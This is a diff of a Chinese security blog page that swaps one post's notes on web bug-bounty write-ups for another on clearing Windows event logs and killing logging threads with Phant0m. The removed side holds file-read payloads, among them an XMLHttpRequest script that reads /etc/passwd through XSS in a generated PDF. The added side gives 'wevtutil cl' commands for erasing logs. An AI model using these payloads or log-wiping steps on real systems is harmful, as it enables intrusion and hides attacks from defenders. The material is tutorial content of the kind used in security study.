@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>2019/5/9随记 · H0e4a0r1t&#39;s Blog</title>
+    <title>H0e4a0r1t&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">H0e4a0r1t&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">2019/5/9随记</a>
+                <a href="#" class="post-name"></a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            2019/5/9随记
+            [Untitled Post]
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">633</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/05/07</span>
+                    <span class="post-intro-time">2019/10/01</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,47 +395,76 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="First：Vulnerable-Javascript-Files"><a href="#First：Vulnerable-Javascript-Files" class="headerlink" title="First：Vulnerable Javascript Files"></a>First：<a href="https://medium.com/@ghostlulzhacks/vulnerable-javascript-file-188b6287179" target="_blank" rel="noopener">Vulnerable Javascript Files</a></h2><ol>
-<li>今天几乎每个网站都以某种方式使用javascript。Jquery，anglular，react和vue是流行的javascript库和框架的一些例子。其中每个都包含漏洞，如果网站使用过时的版本，他们就有可能实施易受攻击的功能，从而使整个网站面临风险</li>
-<li>Retire JS是一个很棒的工具，可以扫描网站上过时的软件。使用此工具最简单的方法是下载chrome插件。下载插件后，它将扫描您在后台访问的每个站点，查找过时的javascript文件，其中许多文件包含已知的CVE。 </li>
-<li>重要的是要知道，仅仅因为网站导入易受攻击的javascript文件并不意味着您可以利用此漏洞。为了利用此漏洞，网站必须使用易受攻击的功能。可以在不使用易受攻击的功能的情况下导入易受攻击的库。但是，即使你不能利用已经过时软件的漏洞总是不好的做法。如果该网站正在实施易受攻击的功能，那么您就获得了胜利</li>
-<li>自动化批量检测脚本：<a href="https://github.com/ghostlulzhacks/RetireJs" target="_blank" rel="noopener">https://github.com/ghostlulzhacks/RetireJs</a></li>
-</ol>
-<hr>
-<h2 id="Second：P4-to-P2-The-story-of-one-blind-SSRF"><a href="#Second：P4-to-P2-The-story-of-one-blind-SSRF" class="headerlink" title="Second：P4 to P2 - The story of one blind SSRF"></a>Second：<a href="https://mike-n1.github.io/SSRF_P4toP2" target="_blank" rel="noopener">P4 to P2 - The story of one blind SSRF</a></h2><h3 id="1-尝试XSS"><a href="#1-尝试XSS" class="headerlink" title="1.尝试XSS"></a>1.尝试XSS</h3><p>发现转换为pdf格式的上传点可以上传html文件，发现上传带有payload的html文件并没有被解析</p>
-<h3 id="2-尝试读取本地文件"><a href="#2-尝试读取本地文件" class="headerlink" title="2.尝试读取本地文件"></a>2.尝试读取本地文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;object width=&quot;400&quot; height=&quot;400&quot; data=&quot;file://c:/windows/win.ini&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;file:///C:/Windows/win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;file://c:/windows/win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>尝试通过img标签包含现有的本地图像。但是，Web服务器上存在100％的哪种图片？记住用户代理的类型，Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)这可能意味着它是Internet Explorer的标题。我发现默认情况下使用此浏览器存在于Web服务器上的图像 - C:\Program Files\Internet Explorer\images\bing.ico并尝试包含它（不要忘记使用’file：//‘）。</p>
-<p>最后，我有一个有效载荷： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;file:///C:\Program Files\Internet Explorer\images\bing.ico&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="Third：LOCAL-FILE-READ-VIA-XSS-IN-DYNAMICALLY-GENERATED-PDF"><a href="#Third：LOCAL-FILE-READ-VIA-XSS-IN-DYNAMICALLY-GENERATED-PDF" class="headerlink" title="Third：LOCAL FILE READ VIA XSS IN DYNAMICALLY GENERATED PDF"></a>Third：<a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html" target="_blank" rel="noopener">LOCAL FILE READ VIA XSS IN DYNAMICALLY GENERATED PDF</a></h2><h3 id="在动态生成的PDF中通过XSS读取本地文件"><a href="#在动态生成的PDF中通过XSS读取本地文件" class="headerlink" title="在动态生成的PDF中通过XSS读取本地文件"></a>在动态生成的PDF中通过XSS读取本地文件</h3><p>url:<a href="https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;utrnumber=xyz&amp;date=2017-08-11&amp;settlement_type=all&amp;advice_id=undefined" target="_blank" rel="noopener">https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;utrnumber=xyz&amp;date=2017-08-11&amp;settlement_type=all&amp;advice_id=undefined</a></p>
-<p>其中，utrnumber的参数会反映在已下载的PDF文件中，我在<strong>utrnumber</strong>参数中写了一些HTML 作为<strong>“&gt; <s> aaa</s></strong></p>
-<p>即：<a href="https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**“&gt;" target="_blank" rel="noopener">https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**“&gt;</a> <s> aaa**＆date = 2017-08-11＆settlement_type = all＆advice_id = undefined </s></p>
-<p><img src="https://i.loli.net/2019/05/10/5cd4dfdb7b696.png" alt></p>
-<p>接着发现可以使用<strong>&lt;img src=x onerror=document.write(‘aaaa’)&gt;</strong>打印出aaa的值</p>
-<p><a href="https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**utrnumber**=*" target="_blank" rel="noopener">https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**utrnumber**=*</a>*&lt;img src=x onerror=document.write(‘aaaa’)&gt;**&amp;date=2017-08-11&amp;settlement_type=all&amp;advice_id=undefined</p>
-<p><img src="https://i.loli.net/2019/05/10/5cd4e19a65490.png" alt></p>
-<p>之后发现window.location的执行位置在服务器上的file:// origin上执行（个人理解为：文件在服务器端生成，所以location的源头应该在服务器上）</p>
-<p>之后通过：<a href="https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**utrnumber**=*" target="_blank" rel="noopener">https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;**utrnumber**=*</a>*&lt;img src=x onerror=document.write(‘aaaa’%2bwindow.location)&gt;**&amp;date=2017-08-11&amp;settlement_type=all&amp;advice_id=undefined</p>
-<p><img src="https://i.loli.net/2019/05/10/5cd4e19a6fd30.png" alt></p>
-<p>最后通过XMLHttpRequest的方式访问file:///etc/passwd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x=new XMLHttpRequest;</span><br><span class="line">x.onload=function()&#123;</span><br><span class="line">document.write(this.responseText)</span><br><span class="line">&#125;;</span><br><span class="line">x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);</span><br><span class="line">x.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>构造最终的POC：<a href="https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;utrnumber=*" target="_blank" rel="noopener">https://xyz.com/payments/downloadStatements?Id=b9bc3d&amp;utrnumber=*</a>*<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(“GET”,”file:///etc/passwd”);x.send();</script>**&amp;date=2017-08-11&amp;settlement_type=all&amp;advice_id=undefined</p>
-<p><img src="https://i.loli.net/2019/05/10/5cd4e3fa1769e.png" alt></p>
-<h3 id="服务器端的XSS生成PDF到本地文件读取"><a href="#服务器端的XSS生成PDF到本地文件读取" class="headerlink" title="服务器端的XSS生成PDF到本地文件读取"></a>服务器端的XSS生成PDF到本地文件读取</h3><h2 id="Fourth：Escalating-XSS-in-PhantomJS-Image-Rendering-to-SSRF-Local-File-Read"><a href="#Fourth：Escalating-XSS-in-PhantomJS-Image-Rendering-to-SSRF-Local-File-Read" class="headerlink" title="Fourth：Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read"></a>Fourth：<a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="noopener">Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read</a></h2><p><strong>该计划接受用户输入并生成图像供您下载。经过一段时间后，我能够从图像内部的XSS一直升级到服务器上的任意本地文件读取</strong></p>
-<p>案例过程和上面的差不多，就不做分析了</p>
-<h2 id="Fiveth：新思路–APP端上传通讯录导致SQL注入"><a href="#Fiveth：新思路–APP端上传通讯录导致SQL注入" class="headerlink" title="Fiveth：新思路–APP端上传通讯录导致SQL注入"></a>Fiveth：新思路–APP端上传通讯录导致SQL注入</h2><p>有些app软件是要求上传通讯录的，上传时可以通过抓包，观察参数得到注入</p>
-<h2 id="Sixth：文件上传XXE"><a href="#Sixth：文件上传XXE" class="headerlink" title="Sixth：文件上传XXE"></a>Sixth：文件上传XXE</h2><p>将doc或pdf等各种文件格式，解压出来，查看内部文本，往document.xml中插入XXE恶意代码</p>
-<p><img src="https://i.loli.net/2019/05/10/5cd4f311ea685.png" alt></p>
-<p>参考：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
+        <h2 id="Windows日志的删除与绕过"><a href="#Windows日志的删除与绕过" class="headerlink" title="Windows日志的删除与绕过"></a>Windows日志的删除与绕过</h2><h3 id="0x01-Windows日志"><a href="#0x01-Windows日志" class="headerlink" title="0x01. Windows日志"></a>0x01. Windows日志</h3><p>Windows日志包括五个类别：</p>
+<ul>
+<li>应用程序（Application）</li>
+<li>安全（Security）</li>
+<li>Setup</li>
+<li>系统（System）</li>
+<li>转发事件（Forwarded Events）</li>
+</ul>
+<p>1、通过面板</p>
+<p>位置如下：控制面板–》系统和安全–》管理工具–》查看事件日志</p>
+<p><img src="https://i.loli.net/2019/10/01/ESrqDiUwe94x3LB.png" alt="1.png"></p>
+<p>2、 通过Powershell</p>
+<p>常用命令如下：</p>
+<p>(管理员权限)</p>
+<p>查看所有日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/01/uvkOr3VKgl5LiIt.png" alt="2.png"></p>
+<p>查看应用程序类别下的日志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent -FilterHashtable @&#123;logname=&quot;Application&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/01/wh4KnavgL3RXIpu.png" alt="3.png"></p>
+<h3 id="0x02-Windows日志的常用清除方法"><a href="#0x02-Windows日志的常用清除方法" class="headerlink" title="0x02. Windows日志的常用清除方法"></a>0x02. Windows日志的常用清除方法</h3><h3 id="1、wevtutil-exe"><a href="#1、wevtutil-exe" class="headerlink" title="1、wevtutil.exe"></a>1、wevtutil.exe</h3><p>操作系统默认包含，支持系统：Win7及以上</p>
+<p>常用命令如下：</p>
+<p>(1) 统计日志列表，查询指定类别的所有日志信息，包含时间，数目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil.exe gli Security</span><br></pre></td></tr></table></figure>
+<p>操作如下图</p>
+<p><img src="https://i.loli.net/2019/10/01/qTCPh4JdprgFQy7.png" alt="4.png"></p>
+<p>(2) 查看指定类别的日志内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text Security</span><br></pre></td></tr></table></figure>
+<p>操作如下图</p>
+<p><img src="https://i.loli.net/2019/10/01/gUXVeT2nzjJc6Od.png" alt="5.png"></p>
+<p><strong>(3)</strong> 删除该类日志所有内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Application</span><br></pre></td></tr></table></figure>
+<p>操作如下图</p>
+<p><img src="https://i.loli.net/2019/10/01/VnicOSYoD3E4rpl.png" alt="6.png"></p>
+<p>Application日志全部清除，数目为0</p>
+<p><strong>(4)</strong> 删除单条内容</p>
+<p>尚不支持</p>
+<h3 id="0x03-Windows日志的绕过方法"><a href="#0x03-Windows日志的绕过方法" class="headerlink" title="0x03. Windows日志的绕过方法"></a>0x03. Windows日志的绕过方法</h3><p>参考：<a href="https://artofpwn.com/phant0m-killing-windows-event-log.html" target="_blank" rel="noopener">https://artofpwn.com/phant0m-killing-windows-event-log.html</a></p>
+<p><strong>绕过原理：</strong></p>
+<p>Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，终止有关Windows事件日志服务的所有线程，调用TerminateThread结束线程，破坏日志记录功能破坏日志记录功能</p>
+<p><strong>特别的地方：</strong></p>
+<p>Windows事件日志服务的svchost.exe进程尚未停止，而只有相关线程已停止；因此，目标系统将无法收集日志，并且因为无法收集日志而将无法发送日志，但是Windows事件日志服务仍然正在运行</p>
+<p><strong>绕过方法一</strong></p>
+<p><strong>1、</strong> 定位eventlog服务对应进程svchost.exe的pid</p>
+<p><strong>2、</strong> 遍历该进程中的所有线程</p>
+<p><strong>3、</strong> 判断线程是否满足条件</p>
+<p>Windows Event Log 服务需要调用wevtsvc.dll，完整路径为<code>%WinDir%\System32\wevtsvc.dll</code></p>
+<p>并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能</p>
+<p><strong>4、</strong> 结束线程</p>
+<p>使用TerminateThread</p>
+<p>Phant0m（<a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">https://github.com/hlldz/Invoke-Phant0m</a>）</p>
+<p>powershell脚本执行后，Windows日志功能失效，无法记录日志，操作如下图</p>
+<p><img src="https://i.loli.net/2019/10/02/jMlhkIwAnpXi6og.png" alt="3-1.png"></p>
+<p><strong>5、</strong> 恢复方法</p>
+<p>结束进程svchost.exe</p>
+<p>重新开启Windows Event Log 服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start eventlog</span><br></pre></td></tr></table></figure>
+<p>操作如下图</p>
+<p><img src="https://i.loli.net/2019/10/02/yevmt2CWFRa4O8k.png" alt="3-2.png"></p>
+<p><strong>先水一篇吧，下期再说 :)</strong></p>
+<p>参考：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/05/07/2019-5-9随记/">http://yoursite.com/2019/05/07/2019-5-9随记/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/05/07/2019-5-9随记/">May 7th 2019, 9:52:17 am</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/05/07/2019-5-9随记/">May 10th 2019, 11:43:36 am</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/10/01/Windows日志的删除与绕过/">http://yoursite.com/2019/10/01/Windows日志的删除与绕过/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/10/01/Windows日志的删除与绕过/">October 1st 2019, 10:31:19 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/10/01/Windows日志的删除与绕过/">October 2nd 2019, 1:32:13 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -443,17 +472,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/07/url跳转/" title="URL跳转">
-                    <div class="nextTitle">URL跳转</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/05/05/wfuzz/" title="WFUZZ">
-                    <div class="prevTitle">WFUZZ</div>
+                <a href="/2019/09/30/phpstudy后门/" title="phpstudy后门分析">
+                    <div class="prevTitle">phpstudy后门分析</div>
                 </a>
             
         </li>
@@ -572,7 +596,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#First：Vulnerable-Javascript-Files"><span class="toc-number">1.</span> <span class="toc-text">First：Vulnerable Javascript Files</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Second：P4-to-P2-The-story-of-one-blind-SSRF"><span class="toc-number">2.</span> <span class="toc-text">Second：P4 to P2 - The story of one blind SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-尝试XSS"><span class="toc-number">2.1.</span> <span class="toc-text">1.尝试XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-尝试读取本地文件"><span class="toc-number">2.2.</span> <span class="toc-text">2.尝试读取本地文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Third：LOCAL-FILE-READ-VIA-XSS-IN-DYNAMICALLY-GENERATED-PDF"><span class="toc-number">3.</span> <span class="toc-text">Third：LOCAL FILE READ VIA XSS IN DYNAMICALLY GENERATED PDF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在动态生成的PDF中通过XSS读取本地文件"><span class="toc-number">3.1.</span> <span class="toc-text">在动态生成的PDF中通过XSS读取本地文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器端的XSS生成PDF到本地文件读取"><span class="toc-number">3.2.</span> <span class="toc-text">服务器端的XSS生成PDF到本地文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fourth：Escalating-XSS-in-PhantomJS-Image-Rendering-to-SSRF-Local-File-Read"><span class="toc-number">4.</span> <span class="toc-text">Fourth：Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fiveth：新思路–APP端上传通讯录导致SQL注入"><span class="toc-number">5.</span> <span class="toc-text">Fiveth：新思路–APP端上传通讯录导致SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sixth：文件上传XXE"><span class="toc-number">6.</span> <span class="toc-text">Sixth：文件上传XXE</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows日志的删除与绕过"><span class="toc-number">1.</span> <span class="toc-text">Windows日志的删除与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Windows日志"><span class="toc-number">1.1.</span> <span class="toc-text">0x01. Windows日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Windows日志的常用清除方法"><span class="toc-number">1.2.</span> <span class="toc-text">0x02. Windows日志的常用清除方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、wevtutil-exe"><span class="toc-number">1.3.</span> <span class="toc-text">1、wevtutil.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Windows日志的绕过方法"><span class="toc-number">1.4.</span> <span class="toc-text">0x03. Windows日志的绕过方法</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
